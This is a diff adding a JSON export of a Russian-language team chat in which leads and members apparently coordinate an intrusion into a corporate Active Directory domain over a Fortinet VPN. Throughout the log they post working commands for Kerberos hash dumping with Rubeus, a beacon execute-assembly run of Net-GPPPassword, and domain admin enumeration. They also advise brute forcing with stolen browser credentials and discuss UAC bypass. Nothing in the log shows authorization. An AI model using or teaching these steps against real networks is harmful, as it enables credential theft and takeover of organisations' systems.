@@ -1,0 +1,906 @@
+{
+  "messages": [
+    {
+      "_id": "pmazmBLTHpNQqnJaP",
+      "rid": "GENERAL",
+      "msg": "как подсказка",
+      "ts": "2020-09-21T23:11:51.646Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-21T23:11:51.683Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "bFcaFdntJ68mqL5pa",
+      "rid": "GENERAL",
+      "msg": "```\nshell net group \"domain admins\" /dom && net group \"enterprise admins\" /dom && net localgroup administrators\n```",
+      "ts": "2020-09-21T23:11:45.542Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-21T23:11:45.597Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "rCzHL6YWY2jXixb9T",
+      "rid": "GENERAL",
+      "msg": "Может нам дадите сессию?",
+      "ts": "2020-09-21T22:53:29.977Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-09-21T22:53:30.010Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zZBkHE4RnTvxFKw9n",
+      "rid": "GENERAL",
+      "msg": "попробуйте дотнетом побрутить или смб логином",
+      "ts": "2020-09-21T22:24:49.870Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-21T22:24:49.901Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "utirKH4x9jeLazLSe",
+      "rid": "GENERAL",
+      "msg": "а нет не пошло",
+      "ts": "2020-09-21T22:20:52.387Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:20:52.413Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZNrfhZbMEa4M9BnN3",
+      "rid": "GENERAL",
+      "msg": "а всё пошло",
+      "ts": "2020-09-21T22:17:33.727Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:17:33.780Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jcJRskxidkpY4S7u2",
+      "rid": "GENERAL",
+      "msg": "есть смысл в мсф через smb_login?",
+      "ts": "2020-09-21T22:13:38.096Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:13:38.129Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "BCkjg65ugdsEPjnCF",
+      "rid": "GENERAL",
+      "msg": "а с брутом как быть?",
+      "ts": "2020-09-21T22:13:17.036Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:13:17.067Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "PXAduKn87iF7pHjtN",
+      "rid": "GENERAL",
+      "msg": "да",
+      "ts": "2020-09-21T22:09:37.424Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-21T22:09:37.464Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ArSWGEnkfvyHXQANe",
+      "rid": "GENERAL",
+      "msg": "просто у нас нет",
+      "ts": "2020-09-21T22:08:49.911Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:08:49.925Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "cznMPgJXPK2mBJ88j",
+      "rid": "GENERAL",
+      "msg": "ну и отпарсило что-то?",
+      "ts": "2020-09-21T22:08:47.657Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:08:47.680Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qCZjuB6J8N3pCSYDe",
+      "rid": "GENERAL",
+      "msg": "```\nbeacon> execute-assembly /home/omar/Desktop/Fast-Guide/Net-GPPPassword.exe\n[*] Tasked beacon to run .NET program: Net-GPPPassword.exe\n[+] host called home, sent: 114731 bytes\n[+] received output:\nProcessing files in \\\\GPJ.LOC\\sysvol\\GPJ.LOC\\policies\\\n``` \n\nа у меня пускает",
+      "ts": "2020-09-21T22:08:09.169Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-21T22:08:09.276Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "xTJXQDPwqEK27mwet",
+      "rid": "GENERAL",
+      "msg": "как бы и ошибки нет, но и результата нет тоже",
+      "ts": "2020-09-21T22:04:50.615Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:04:50.637Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "rABTkFXSRbvvafuJS",
+      "rid": "GENERAL",
+      "msg": "но ничего не происходит",
+      "ts": "2020-09-21T22:04:28.137Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:04:28.157Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "b8jbRWr4qGxFYdaGi",
+      "rid": "GENERAL",
+      "msg": "и elevate вроде отрабатывает",
+      "ts": "2020-09-21T22:04:24.979Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:04:24.992Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "HT2nW9rj56Ssei88v",
+      "rid": "GENERAL",
+      "msg": "SharpUp говорит - да, ребята, юзер - локал админ, можно обойти юак",
+      "ts": "2020-09-21T22:04:15.265Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:04:15.296Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "p4SCoByizn5ozFFvz",
+      "rid": "GENERAL",
+      "msg": "ни Net-GPPPassword",
+      "ts": "2020-09-21T22:03:03.694Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:03:03.715Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "YrEGSyAfhBe4nzyd9",
+      "rid": "GENERAL",
+      "msg": "ни винпис их не показывает",
+      "ts": "2020-09-21T22:02:52.050Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:02:52.076Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "LfPzTkGiFX7iQimjZ",
+      "rid": "GENERAL",
+      "msg": "к гпп не пускает",
+      "ts": "2020-09-21T22:02:44.377Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:02:44.410Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jQWyWqKQ2sWseZi4Z",
+      "rid": "GENERAL",
+      "msg": "такие пироги",
+      "ts": "2020-09-21T22:02:11.103Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:02:11.121Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "MFk98dMvL5BLmnjsp",
+      "rid": "GENERAL",
+      "msg": "что не пробовали до этого",
+      "ts": "2020-09-21T22:02:09.044Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:02:09.070Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "49uJtunLLqXXWZsqg",
+      "rid": "GENERAL",
+      "msg": "сейчас парни пробуют всё из гостпака",
+      "ts": "2020-09-21T22:02:00.967Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:02:00.992Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "KiaTtoYoTvWbQDaRb",
+      "rid": "GENERAL",
+      "msg": "они не отрабатывают",
+      "ts": "2020-09-21T22:01:38.256Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:01:38.288Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zu66JAKDAoo8CsFqv",
+      "rid": "GENERAL",
+      "msg": "ватсон показывает две уязвимости",
+      "ts": "2020-09-21T22:01:34.856Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:01:34.885Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "A9cuabnRRtm4vxxyk",
+      "rid": "GENERAL",
+      "msg": "рубеус и керберост не принимает",
+      "ts": "2020-09-21T22:01:02.804Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:01:02.836Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ukhAtty9rh8WBGegb",
+      "rid": "GENERAL",
+      "msg": "домен указывали как gpj, так и gpj.loc",
+      "ts": "2020-09-21T22:00:48.887Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:00:48.911Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "fPKbuiuPuQta5soa4",
+      "rid": "GENERAL",
+      "msg": "С Семёном попробовали запустить брут по кредам с шарпхрома, ругается на домен",
+      "ts": "2020-09-21T22:00:39.212Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T22:00:39.242Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "FLt9FwXjZTXrZedCq",
+      "rid": "GENERAL",
+      "msg": "какие сейчас проблемы?",
+      "ts": "2020-09-21T22:00:11.857Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-21T22:00:11.884Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "tYWXwrsRhteA9Ddp8",
+      "rid": "GENERAL",
+      "msg": "[ ](https://mediaeveryone.com/channel/general?msg=9jNJDKiXxwpxapwMa) eto ne tak",
+      "ts": "2020-09-21T21:59:55.957Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T21:59:55.990Z",
+      "attachments": [
+        {
+          "text": "есть прогресс?)",
+          "author_name": "tl1",
+          "author_icon": "/avatar/tl1",
+          "message_link": "https://mediaeveryone.com/channel/general?msg=9jNJDKiXxwpxapwMa",
+          "attachments": [],
+          "ts": "2020-09-21T21:59:40.974Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/channel/general?msg=9jNJDKiXxwpxapwMa",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "CrmD5wbAXSzWL86KC",
+      "rid": "GENERAL",
+      "msg": "eto tak",
+      "ts": "2020-09-21T21:59:44.945Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T21:59:44.974Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9jNJDKiXxwpxapwMa",
+      "rid": "GENERAL",
+      "msg": "есть прогресс?)",
+      "ts": "2020-09-21T21:59:40.974Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-21T21:59:41.001Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZKYnDTCtZZSNNG8rM",
+      "rid": "GENERAL",
+      "msg": "+1",
+      "ts": "2020-09-21T21:59:19.523Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-21T21:59:19.546Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3T4fMkJgscvnBnf4H",
+      "rid": "GENERAL",
+      "msg": "Ага",
+      "ts": "2020-09-21T21:59:11.947Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-09-21T21:59:11.984Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "AgBWxvcRehkRAhJqY",
+      "rid": "GENERAL",
+      "msg": "все еще тут?",
+      "ts": "2020-09-21T21:58:50.184Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-21T21:58:50.220Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "mpwc66CcxwR8g9sNA",
+      "rid": "GENERAL",
+      "msg": "сегодня до 12",
+      "ts": "2020-09-21T20:25:22.230Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-21T20:25:22.264Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "MHR964JYGtXqPRNYH",
+      "rid": "GENERAL",
+      "msg": "первые сообщения в новой группе:\n1) Домен Админы\n2) Энтерпрайс Админы\n3) Локал Админы\n4) Ад Инфо",
+      "ts": "2020-09-21T18:57:55.545Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-21T18:57:55.580Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "BvnTRW8RAyGQ95uae",
+      "rid": "GENERAL",
+      "msg": "```\nexecute-assembly /Rubeus.exe asreproast /format:hashcat /outfile:C:\\ProgramData\\asrephashes.txt\n```",
+      "ts": "2020-09-21T14:20:05.444Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-21T14:20:05.480Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "W6CTgawEthPZpXg7z",
+      "rid": "GENERAL",
+      "msg": "https://habr.com/ru/company/pt/blog/423903/",
+      "ts": "2020-09-21T14:19:40.889Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-21T14:19:40.925Z",
+      "urls": [
+        {
+          "url": "https://habr.com/ru/company/pt/blog/423903/"
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "7DMdi2BSHTAc2MHFE",
+      "rid": "GENERAL",
+      "msg": "выводит справку",
+      "ts": "2020-09-21T13:22:24.022Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-21T13:22:24.054Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "bf46zDJHRuBtXfohf",
+      "rid": "GENERAL",
+      "msg": "не работает с параметром `kerberoast`",
+      "ts": "2020-09-21T13:22:06.816Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-21T13:22:06.850Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9fjRF7KyAxQDQHb2Z",
+      "rid": "GENERAL",
+      "msg": "```\nexecute-assembly /Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\\ProgramData\\hashes.txt\n``` \nдампает все крб хеши, аналог скрипта на ps",
+      "ts": "2020-09-21T12:58:38.499Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-21T12:58:38.559Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "kg2buXWEe9Ec6XR4M",
+      "rid": "GENERAL",
+      "msg": "`31d6cfe0d16ae931b73c59d7e0c089c0` - пустая строка, запомните! Не бывает в АД пользователей с таким паролем, если вы видите такой псс, значит акк не работает",
+      "ts": "2020-09-21T10:32:17.865Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-21T10:32:17.889Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9NeDzmxNLL79PasJG",
+      "rid": "GENERAL",
+      "msg": "сократите до telnet,ssh,web,mssql,smb,rdp,vnc",
+      "ts": "2020-09-21T10:25:36.227Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-21T10:25:57.722Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-09-21T10:25:57.720Z",
+      "editedBy": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1"
+      },
+      "urls": []
+    },
+    {
+      "_id": "miNLTjWQzka3Hy75C",
+      "rid": "GENERAL",
+      "msg": "`ports 1-1024,3389,5900-6000`\nзачем сканить такой диапазон? тут 900 пустых портов и нет mssql?",
+      "ts": "2020-09-21T10:25:01.623Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-21T10:25:01.663Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "wK46BuEopdfkadh4x",
+      "rid": "GENERAL",
+      "msg": "ясно))",
+      "ts": "2020-09-21T09:30:53.936Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-21T09:30:53.963Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9puSjzv6hEcJHC57M",
+      "rid": "GENERAL",
+      "msg": "Вот так отображается вкл ВПН",
+      "ts": "2020-09-21T09:30:27.877Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-21T09:30:27.910Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "e57GfwFszbjFWQfsh",
+      "rid": "GENERAL",
+      "msg": "```\n                           [02]: Fortinet SSL VPN Virtual Ethernet Adapter\n                                 Connection Name: Ethernet 3\n                                 DHCP Enabled:    No\n                                 IP address(es)\n                                 [01]: 10.59.12.209\n                                 [02]: fe80::89c3:6e80:ed9e:ca27\n\n```",
+      "ts": "2020-09-21T09:30:20.583Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-21T09:30:20.682Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "5tjvpvhXFAXyJwF8k",
+      "rid": "GENERAL",
+      "msg": "```\nвпн, вроде, был активен\n``` \nесли просто висит его процесс это не значит что он активен)",
+      "ts": "2020-09-21T09:24:56.157Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-21T09:24:56.205Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qPCYAXp5fTxFK5Dnh",
+      "rid": "GENERAL",
+      "msg": "ок. появится - попробуем",
+      "ts": "2020-09-21T09:24:13.361Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-21T09:24:13.400Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "CQRgenDMgHjBvPvui",
+      "rid": "GENERAL",
+      "msg": "также как в классике с циско клиентами вообщем",
+      "ts": "2020-09-21T09:23:39.271Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-21T09:23:39.297Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "cECyWXs2YCGT783BQ",
+      "rid": "GENERAL",
+      "msg": "впн, вроде, был активен",
+      "ts": "2020-09-21T09:23:39.136Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-21T09:23:39.160Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zEL6cF4M6sRAMiF8p",
+      "rid": "GENERAL",
+      "msg": "либо ЛДАП привязан там либо через РАДИУС происходит авторизация",
+      "ts": "2020-09-21T09:23:31.136Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-21T09:23:31.164Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "SvzAbCqrctXLzFsrE",
+      "rid": "GENERAL",
+      "msg": "мы же вроде бы как раз обсуждали этот момент с Фортигейт клиентом, суть в том что подключаясь по ВПНу через фортигейт клиент через \"доменные\" креды происходит и подключение машины в домен",
+      "ts": "2020-09-21T09:23:19.044Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-21T09:23:19.075Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "LqKDki3armuzhg73D",
+      "rid": "GENERAL",
+      "msg": "чтобы было видно домен",
+      "ts": "2020-09-21T09:22:25.639Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-21T09:22:25.662Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "AhzayWjwGf5zhJSnB",
+      "rid": "GENERAL",
+      "msg": "Подключиться по впну",
+      "ts": "2020-09-21T09:22:22.226Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-21T09:22:22.249Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "E8rhHrPHxLTm5mgxP",
+      "rid": "GENERAL",
+      "msg": "@tl1 , пока есть время, может подскажешь, как быть в сети matches? Там не видно ДК. Ести какие то мысли на этот счет?",
+      "ts": "2020-09-21T09:21:34.414Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-21T09:21:34.451Z",
+      "mentions": [
+        {
+          "_id": "yJcaRFnKQqepiffHq",
+          "username": "tl1",
+          "name": "Team Lead 1"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "dQzW9N9mq6qpA6nEf",
+      "rid": "GENERAL",
+      "msg": "доброе)",
+      "ts": "2020-09-21T09:10:23.647Z",
+      "u": {
+        "_id": "rXsLqNFiFXTjuq7g7",
+        "username": "ot",
+        "name": "Office Team"
+      },
+      "_updatedAt": "2020-09-21T09:10:23.676Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ffSbHsWKZkdR355GJ",
+      "rid": "GENERAL",
+      "msg": "Доброе утро всем",
+      "ts": "2020-09-21T09:07:38.869Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-09-21T09:07:38.897Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3mxAoePjigzCW7ryp",
+      "rid": "GENERAL",
+      "msg": ":metal:",
+      "ts": "2020-09-21T08:01:41.934Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-21T08:01:41.962Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "NG3yhiFA48E2ZHxpS",
+      "rid": "GENERAL",
+      "msg": "hi",
+      "ts": "2020-09-21T08:00:31.746Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-21T08:00:31.786Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zpFyS4ktKnwusWjPQ",
+      "rid": "GENERAL",
+      "msg": "Доброе утро!",
+      "ts": "2020-09-21T07:53:34.178Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-09-21T07:53:34.211Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ugznRZz6iMYCJs8cf",
+      "rid": "GENERAL",
+      "msg": "Доброе утро",
+      "ts": "2020-09-21T07:49:47.096Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-09-21T07:49:47.134Z",
+      "mentions": [],
+      "channels": []
+    }
+  ],
+  "success": true
+}
